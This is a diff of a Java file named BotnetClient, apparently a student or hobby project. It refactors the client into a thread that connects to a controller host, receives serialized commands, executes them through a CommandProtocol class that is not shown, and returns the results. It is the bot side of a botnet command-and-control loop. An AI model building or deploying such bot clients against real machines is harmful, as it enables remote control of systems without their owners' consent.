@@ -1,3 +1,44 @@
+// import java.net.*;
+// import java.io.*;
+
+// public class BotnetClient {
+//     public static void main(String[] args) throws IOException {
+//         if (args.length != 2) {
+//             System.err.println("Usage: java BotnetClient <host name> <port number>");
+//             System.exit(1);
+//         }
+
+//         String hostName = args[0];
+//         int portNumber = Integer.parseInt(args[1]);
+//         CommandProtocol commandP = new CommandProtocol();
+//         try (Socket socket = new Socket(hostName, portNumber);
+//              ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
+//              ObjectInputStream in = new ObjectInputStream(socket.getInputStream())) {
+
+//             while (true) {
+//                 try {
+//                     Command inCommand = (Command) in.readObject();
+//                     System.out.println("[+] Running Command " + inCommand.getCommandName());
+//                     commandP.processCommand(inCommand);
+
+//                     out.writeObject(inCommand);
+//                     out.flush();
+//                     if (inCommand.getIsExecuted()) {
+//                         break;
+//                     }
+//                 } catch (EOFException e) {
+//                     System.err.println("[-] Server closed the connection.");
+//                     break;
+//                 }
+//             }
+
+//         } catch (ClassNotFoundException e) {
+//             System.err.println("[-] BotnetClient: Problem reading object: class not found");
+//             e.printStackTrace();
+//         }
+//     }
+// }
+
 import java.net.*;
 import java.io.*;
 
@@ -5,140 +46,87 @@ import java.io.*;
  * BotnetClient Class:
  * Object used to receive commands from server, process them, and send back to server
  */
-public class BotnetClient{
-    public static void main(String[] args) throws IOException {
-        //Properties
-        ObjectInputStream in = null;
-        ObjectOutputStream out = null;
+public class BotnetClient extends Thread {
+    private String hostName;
+    private int portNumber;
+    private CommandProtocol commandP;
+
+    public BotnetClient(String hostName, int portNumber) {
+        this.hostName = hostName;
+        this.portNumber = portNumber;
+        this.commandP = new CommandProtocol();
+    }
+
+    public void run() {
         Command inCommand = null;
-        CommandQueue inQueue = null;
+        ObjectOutputStream out = null;
         Socket socket = null;
-        CommandProtocol commandP = new CommandProtocol();
-        
-        //make sure class is called correctly
-        if (args.length != 2){
-            System.err.println(
-                "Usage: java EchoClient <host name> <port number>");
+        ObjectInputStream in = null;
+
+        try {
+            socket = new Socket(hostName, portNumber);
+            out = new ObjectOutputStream(socket.getOutputStream());
+            in = new ObjectInputStream(socket.getInputStream());
+            inCommand = (Command) in.readObject();
+        } catch (IOException | ClassNotFoundException e) {
+            System.err.println("[-] BotnetClient: Problem communicating with server");
+            e.printStackTrace();
+            return; // Terminate the thread
+        }
+
+        try {
+            while (true) {
+                if (inCommand != null) {
+                    System.out.println("[+] Running Command " + inCommand.getCommandName());
+                    commandP.processCommand(inCommand);
+                    out.writeObject(inCommand);
+                    if (inCommand.getErrorStatus()) {
+                        break;
+                    }
+                    try{
+                        inCommand = (Command) in.readObject();
+                    }catch(ClassNotFoundException e){
+                        System.err.println("[-] BotNetClient with server");
+                    e.printStackTrace();
+                    }
+                } else {
+                    try {
+                        // Sleep for some time before checking again
+                        Thread.sleep(1000); // Sleep for 1 second (adjust as needed)
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        } catch (IOException e) {
+            System.err.println("[-] BotNetClient: Problem communicating with server");
+            e.printStackTrace();
+        } finally {
+            try {
+                if (out != null)
+                    out.close();
+                if (in != null)
+                    in.close();
+                if (socket != null)
+                    socket.close();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    public static void main(String[] args) {
+        if (args.length != 2) {
+            System.err.println("Usage: java BotnetClient <host name> <port number>");
             System.exit(1);
         }
 
         String hostName = args[0];
         int portNumber = Integer.parseInt(args[1]);
 
-        //bind the streams
-    //     try{
-    //         socket = new Socket(hostName, portNumber);
-    //         out = new ObjectOutputStream(socket.getOutputStream());
-    //         in = new ObjectInputStream(socket.getInputStream());
-    //         inQueue = (CommandQueue) in.readObject();
-    //     } catch (UnknownHostException e) {
-    //         System.err.println("[-]Don't know about host " + hostName);
-    //         System.exit(1);
-    //     } catch (IOException e) {
-    //         System.err.println("[-]Couldn't get I/O for the connection to " +
-    //             hostName);
-    //         System.exit(1);
-    //     } catch (ClassNotFoundException e){
-    //         System.err.println("[-]IMClient Class not found");
-    //         System.exit(1);
-    //     }
-
-    //     //While there are commands being sent from the server
-        
-    //         while(inQueue!=null){
-    //             inCommand = inQueue.take();
-                
-    //             System.out.println("[+]Running Command " + inCommand.getCommandName());
-                
-    //             //get result from processing command
-    //             String result = commandP.processCommand(inCommand);
-                
-    //             /**Debug prints */
-    //             // System.out.println("[*]Command Result: " + result);
-    //             // System.out.println("[*]Command Response: " + inCommand.getResponse());
-    //             // System.out.println("[*]Command Error Status: " + inCommand.getErrorStatus());
-    //             // System.out.println("[*]Command Is Executed: " + inCommand.getIsExecuted());
-    //             // System.out.println("[*]Command Is Executed: " + inCommand.getIsExecuted());
-                
-    
-    //             //send command back to server
-    //             inQueue.put(inCommand);
-    //             out.writeObject(inQueue);
-    //             //if the command running had an error then close the connection 
-    //             if (inCommand.getErrorStatus() && inCommand.getIsExecuted()){
-    //                 System.err.println("[-] error bro");
-    //                 // break;
-    //             }
-    
-    //             // try{
-    //             //     //if there was no error
-    //             //     if (!inCommand.getErrorStatus())
-    //             //         //get the next command
-    //             //         inQueue = (CommandQueue) in.readObject();
-    //             // }
-    //             // catch (ClassNotFoundException cnfe){
-    //             //     System.err.println("[-]BotNetClient: Problem reading object: class not found");
-    //             //     System.err.println(cnfe);
-    //             //     System.exit(1);
-    //             // }
-    //             // //close streams
-    //             // inQueue = null;
-    //         }
-    //         out.close();
-    //         in.close();
-    //         socket.close();
-        
-    // }    
-
-        // Bind the streams
-        try {
-            socket = new Socket(hostName, portNumber);
-            out = new ObjectOutputStream(socket.getOutputStream());
-            in = new ObjectInputStream(socket.getInputStream());
-        } catch (UnknownHostException e) {
-            System.err.println("[-] Don't know about host " + hostName);
-            System.exit(1);
-        } catch (IOException e) {
-            System.err.println("[-] Couldn't get I/O for the connection to " + hostName);
-            System.exit(1);
-        }
-
-        try {
-            // Main loop to receive and process commands from the server
-            while (true) {
-                // Receive the command queue from the server
-                inQueue = (CommandQueue) in.readObject();
-                if (inQueue == null) {
-                    System.out.println("[-] Server closed the connection.");
-                    break;
-                }
-
-                // Process each command in the queue
-                Command command = inQueue.take();
-                    System.out.println("[+] Running Command " + command.getCommandName());
-
-                    // Process the command
-                    String result = commandP.processCommand(command);
-
-                    // Update the command with the result
-                    command.setResponse(result);
-                
-
-                // Send back the updated queue to the server
-                out.writeObject(inQueue);
-                out.flush();
-            }
-        } catch (ClassNotFoundException e) {
-            System.err.println("[-] BotNetClient: Problem reading object: class not found");
-            e.printStackTrace();
-        } catch (EOFException e) {
-            System.err.println("[-] Connection closed by server.");
-        } finally {
-            // Close the streams and socket
-            if (in != null) in.close();
-            if (out != null) out.close();
-            if (socket != null) socket.close();
-        }
+        BotnetClient botnetClient = new BotnetClient(hostName, portNumber);
+        botnetClient.start(); // Start the botnet client thread
     }
 }
+
 
